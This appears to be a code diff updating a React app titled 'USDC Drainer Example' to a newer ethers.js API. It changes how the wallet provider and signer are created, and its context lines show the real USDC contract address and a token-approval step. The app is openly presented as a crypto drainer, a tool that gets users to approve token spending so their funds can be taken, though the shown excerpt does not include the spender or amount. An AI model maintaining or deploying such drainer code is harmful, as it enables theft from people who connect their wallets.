@@ -1,6 +1,7 @@
 import './App.css';
-import { ethers } from 'ethers';
 import React, { useState } from 'react';
+
+const ethers = require("ethers")
 
 function App() {
   const [userAddress, setUserAddress] = useState('');
@@ -29,8 +30,8 @@ function App() {
       return;
     }
 
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    const signer = provider.getSigner();
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const signer = await provider.getSigner();
 
     // Replace these with your contract details
     const usdcTokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
@@ -51,6 +52,7 @@ function App() {
       console.error('Error approving tokens:', error);
     }
   };
+  
   return (
     <div className="App">
       <h1>USDC Drainer Example</h1>
